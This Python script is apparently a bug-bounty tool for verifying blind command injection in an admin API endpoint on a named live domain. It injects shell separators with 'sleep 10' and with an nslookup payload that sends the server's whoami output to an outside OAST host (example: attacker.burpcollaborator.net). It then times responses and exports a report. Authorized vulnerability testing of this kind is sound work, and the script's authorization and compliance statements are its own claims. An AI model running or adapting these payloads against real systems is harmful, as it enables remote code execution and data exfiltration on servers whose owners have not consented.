#!/usr/bin/env python3
"""
GS RCE Verification Script - nnip.com /api/admin/{id}
Command Injection Blind Testing (Authorized)

Compliance:
  - LuciusClient with X-HackerOne-Research: [lucius-log] header
  - 2-second delay between requests (well under 60 RPS limit)
  - Non-destructive verification only (no /etc/shadow, no pivoting)
  - Time-based and DNS OAST verification methods

Target: https://nnip.com/api/admin/{id}
Output: HackerOne report format
"""

import json
import logging
import subprocess
import sys
import time
from dataclasses import asdict, dataclass
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# Add parent directory to path for imports
sys.path.insert(0, "/Users/chris-peterson/Documents/GitHub/lucius/lucius-workspace")

from core.client import LuciusClient, SafetyException

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger(__name__)


@dataclass
class CommandInjectionResult:
    """Result from a command injection verification attempt"""

    payload: str
    separator: str
    verification_method: str  # "time-based" or "dns-oast"
    status: str  # "verified", "suspicious", "failed"
    evidence: str  # Time delay or OOB trigger details
    response_time: float
    timestamp: str
    payload_url: str  # Full payload URL for report

    def to_dict(self) -> Dict:
        """Convert to dictionary for JSON export"""
        return asdict(self)


class RCEVerifier:
    """Verify blind command injection in nnip.com/api/admin/{id}"""

    SEPARATORS = [";", "|", "&&"]  # Common injection separators
    BASE_URL = "https://nnip.com/api/admin"
    REQUEST_DELAY = 2.0  # 2-second delay between requests (comply with 60 RPS)
    TIME_VERIFICATION_CMD = "sleep 10"  # Sleep 10 seconds for time-based verification
    TOLERANCE_SECONDS = 2.0  # ±2 seconds tolerance for time-based verification

    def __init__(self, rate_limit: int = 50, oast_domain: Optional[str] = None):
        """
        Initialize RCE verifier

        Args:
            rate_limit: Requests per second (default 50, max 50 for compliance)
            oast_domain: OAST domain for DNS verification (e.g., attacker.burpcollaborator.net)
        """
        if rate_limit > 50:
            logger.warning(f"Rate limit {rate_limit} RPS exceeds GS threshold. Capping at 50.")
            rate_limit = 50

        self.client = LuciusClient(rate_limit=rate_limit)
        self.oast_domain = oast_domain
        self.results: List[CommandInjectionResult] = []

        logger.info(f"RCE Verifier initialized with {rate_limit} RPS rate limit")
        logger.info(
            f"X-HackerOne-Research header: {self.client.session.headers.get('X-HackerOne-Research')}"
        )
        if self.oast_domain:
            logger.info(f"OAST domain configured: {self.oast_domain}")

    def _build_time_based_payload(self, admin_id: str, separator: str) -> str:
        """Build time-based verification payload"""
        # Inject sleep command to measure response delay
        # Format: {id}{separator}{sleep_cmd}
        return f"{admin_id}{separator}{self.TIME_VERIFICATION_CMD}"

    def _build_dns_oast_payload(self, admin_id: str, separator: str) -> str:
        """Build DNS OAST verification payload"""
        if not self.oast_domain:
            raise ValueError("OAST domain not configured")

        # Inject command that resolves subdomain containing whoami output
        # Format: {id}{separator}nslookup $(whoami).{oast_domain}
        # Non-destructive: only shows username via DNS query
        return f"{admin_id}{separator}nslookup $(whoami).{self.oast_domain}"

    def verify_time_based(self, admin_id: str = "1") -> List[CommandInjectionResult]:
        """
        Time-based verification: inject sleep 10 command
        Measure response time to detect blind command execution
        """
        logger.info("=" * 70)
        logger.info("TIME-BASED VERIFICATION (Inject sleep 10)")
        logger.info("=" * 70)

        time_based_results = []

        for separator in self.SEPARATORS:
            try:
                # Build payload
                payload = self._build_time_based_payload(admin_id, separator)
                url = f"{self.BASE_URL}/{payload}"

                logger.info(f"\n[ATTEMPT] Separator: '{separator}'")
                logger.info(f"  Payload: {payload}")
                logger.info(f"  URL: {url}")

                # Measure request time
                start_time = time.time()
                try:
                    response = self.client.request("GET", url, timeout=30)
                    elapsed = time.time() - start_time
                except Exception as e:
                    elapsed = time.time() - start_time
                    logger.warning(f"  Request failed: {e}")
                    result = CommandInjectionResult(
                        payload=payload,
                        separator=separator,
                        verification_method="time-based",
                        status="failed",
                        evidence=f"Request failed: {str(e)}",
                        response_time=elapsed,
                        timestamp=datetime.now().isoformat(),
                        payload_url=url,
                    )
                    time_based_results.append(result)
                    self.results.append(result)

                    # Comply with rate limiting
                    time.sleep(self.REQUEST_DELAY)
                    continue

                logger.info(f"  Response time: {elapsed:.2f}s")
                logger.info(f"  Status code: {response.status_code}")

                # Verify: if sleep 10 executed, response should take ~10 seconds
                # With tolerance of ±2 seconds
                expected_min = self.TIME_VERIFICATION_CMD.split()[-1]  # "10"
                expected_delay = int(expected_min)

                if elapsed >= (expected_delay - self.TOLERANCE_SECONDS):
                    status = "verified"
                    evidence = f"Response delayed by {elapsed:.2f}s (expected ~{expected_delay}s). Command injection likely executed."
                    logger.info(f"  [✅ VERIFIED] {evidence}")
                elif elapsed >= 3.0:  # At least 3 seconds suggests delay
                    status = "suspicious"
                    evidence = f"Response delayed by {elapsed:.2f}s (expected ~{expected_delay}s). Possible rate limiting or network delay, but suspicious."
                    logger.info(f"  [⚠️  SUSPICIOUS] {evidence}")
                else:
                    status = "failed"
                    evidence = f"Response returned in {elapsed:.2f}s. No delay detected. Command may not have executed."
                    logger.info(f"  [❌ NOT DETECTED] {evidence}")

                # Record result
                result = CommandInjectionResult(
                    payload=payload,
                    separator=separator,
                    verification_method="time-based",
                    status=status,
                    evidence=evidence,
                    response_time=elapsed,
                    timestamp=datetime.now().isoformat(),
                    payload_url=url,
                )
                time_based_results.append(result)
                self.results.append(result)

            except Exception as e:
                logger.error(f"Error in time-based verification: {e}")

            finally:
                # Comply with 2-second delay between requests (60 RPS limit)
                time.sleep(self.REQUEST_DELAY)

        return time_based_results

    def verify_dns_oast(self, admin_id: str = "1") -> List[CommandInjectionResult]:
        """
        DNS OAST verification: inject nslookup command
        Non-destructive: only shows current user via DNS query
        Requires monitoring of OAST domain for incoming DNS queries
        """
        if not self.oast_domain:
            logger.warning("OAST domain not configured. Skipping DNS OAST verification.")
            return []

        logger.info("=" * 70)
        logger.info("DNS OAST VERIFICATION (Out-of-Band)")
        logger.info("=" * 70)
        logger.info("Note: Monitor your OAST service for incoming DNS queries")
        logger.info("Expected query format: <username>.{oast_domain}")

        dns_oast_results = []

        for separator in self.SEPARATORS:
            try:
                # Build payload
                payload = self._build_dns_oast_payload(admin_id, separator)
                url = f"{self.BASE_URL}/{payload}"

                logger.info(f"\n[ATTEMPT] Separator: '{separator}'")
                logger.info(f"  Payload: {payload}")
                logger.info(f"  URL: {url}")
                logger.info(f"  Expected OOB trigger: <username>.{self.oast_domain}")

                # Send request
                start_time = time.time()
                try:
                    response = self.client.request("GET", url, timeout=30)
                    elapsed = time.time() - start_time
                except Exception as e:
                    elapsed = time.time() - start_time
                    logger.warning(f"  Request failed: {e}")
                    result = CommandInjectionResult(
                        payload=payload,
                        separator=separator,
                        verification_method="dns-oast",
                        status="failed",
                        evidence=f"Request failed: {str(e)}",
                        response_time=elapsed,
                        timestamp=datetime.now().isoformat(),
                        payload_url=url,
                    )
                    dns_oast_results.append(result)
                    self.results.append(result)

                    # Comply with rate limiting
                    time.sleep(self.REQUEST_DELAY)
                    continue

                logger.info(f"  Response time: {elapsed:.2f}s")
                logger.info(f"  Status code: {response.status_code}")
                logger.info(
                    f"  [⏳ PENDING] Monitor your OAST service for DNS query to <username>.{self.oast_domain}"
                )
                logger.info(f"  (DNS responses may arrive within seconds to minutes)")

                # Record result (status depends on OAST monitoring)
                result = CommandInjectionResult(
                    payload=payload,
                    separator=separator,
                    verification_method="dns-oast",
                    status="pending",  # Status depends on OAST monitoring
                    evidence=f"Command injected. Monitor {self.oast_domain} for DNS query from <username> subdomain.",
                    response_time=elapsed,
                    timestamp=datetime.now().isoformat(),
                    payload_url=url,
                )
                dns_oast_results.append(result)
                self.results.append(result)

            except Exception as e:
                logger.error(f"Error in DNS OAST verification: {e}")

            finally:
                # Comply with 2-second delay between requests (60 RPS limit)
                time.sleep(self.REQUEST_DELAY)

        return dns_oast_results

    def generate_report(self) -> Dict:
        """Generate HackerOne report from results"""
        logger.info("\n" + "=" * 70)
        logger.info("HACKERONE REPORT SUMMARY")
        logger.info("=" * 70)

        verified_results = [r for r in self.results if r.status == "verified"]
        suspicious_results = [r for r in self.results if r.status == "suspicious"]

        report = {
            "vulnerability_type": "Blind Command Injection (RCE)",
            "target": self.BASE_URL,
            "severity": (
                "Critical" if verified_results else ("High" if suspicious_results else "Medium")
            ),
            "verification_timestamp": datetime.now().isoformat(),
            "test_summary": {
                "total_attempts": len(self.results),
                "verified_results": len(verified_results),
                "suspicious_results": len(suspicious_results),
                "failed_results": len([r for r in self.results if r.status == "failed"]),
            },
            "results": [r.to_dict() for r in self.results],
            "compliance": {
                "lucius_header_enforced": True,
                "rate_limit_enforced": True,
                "delay_between_requests_seconds": self.REQUEST_DELAY,
                "non_destructive_only": True,
            },
        }

        # Print summary
        print("\n" + "=" * 70)
        print("VERIFIED FINDINGS")
        print("=" * 70)
        if verified_results:
            for result in verified_results:
                print(f"\n✅ VERIFIED COMMAND INJECTION")
                print(f"   Payload: {result.payload}")
                print(f"   Separator: {result.separator}")
                print(f"   Method: {result.verification_method}")
                print(f"   Evidence: {result.evidence}")
                print(f"   Full URL: {result.payload_url}")
        else:
            print("❌ No verified findings (time-based verification inconclusive)")

        print("\n" + "=" * 70)
        print("SUSPICIOUS FINDINGS (Possible)")
        print("=" * 70)
        if suspicious_results:
            for result in suspicious_results:
                print(f"\n⚠️  SUSPICIOUS")
                print(f"   Payload: {result.payload}")
                print(f"   Separator: {result.separator}")
                print(f"   Evidence: {result.evidence}")
        else:
            print("✅ No suspicious findings")

        print("\n" + "=" * 70)
        print("COMPLIANCE VERIFICATION")
        print("=" * 70)
        print(f"✅ LuciusClient header enforced: {report['compliance']['lucius_header_enforced']}")
        print(f"✅ Rate limit enforced: {report['compliance']['rate_limit_enforced']}")
        print(
            f"✅ Delay between requests: {report['compliance']['delay_between_requests_seconds']}s"
        )
        print(f"✅ Non-destructive testing only: {report['compliance']['non_destructive_only']}")

        return report

    def export_json(self, filename: str = "nnip_rce_verification.json") -> str:
        """Export results as JSON for HackerOne report"""
        report = self.generate_report()

        filepath = f"bounty_workspace/{filename}"
        with open(filepath, "w") as f:
            json.dump(report, f, indent=2)

        logger.info(f"\n✅ Report exported to: {filepath}")
        return filepath


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Verify command injection in nnip.com/api/admin/{id}"
    )
    parser.add_argument("--admin-id", default="1", help="Admin ID parameter to test (default: 1)")
    parser.add_argument(
        "--oast-domain",
        help="OAST domain for DNS verification (e.g., attacker.burpcollaborator.net)",
    )
    parser.add_argument(
        "--rate-limit", type=int, default=50, help="Rate limit in RPS (default: 50, max: 50)"
    )
    parser.add_argument(
        "--output",
        default="nnip_rce_verification.json",
        help="Output JSON filename (default: nnip_rce_verification.json)",
    )
    parser.add_argument(
        "--methods",
        default="time-based,dns-oast",
        help="Verification methods to use (comma-separated: time-based, dns-oast)",
    )

    args = parser.parse_args()

    # Initialize verifier
    verifier = RCEVerifier(rate_limit=args.rate_limit, oast_domain=args.oast_domain)

    # Parse verification methods
    methods = [m.strip() for m in args.methods.split(",")]

    # Run verifications
    if "time-based" in methods:
        verifier.verify_time_based(admin_id=args.admin_id)

    if "dns-oast" in methods:
        verifier.verify_dns_oast(admin_id=args.admin_id)

    # Generate and export report
    verifier.export_json(args.output)


if __name__ == "__main__":
    main()
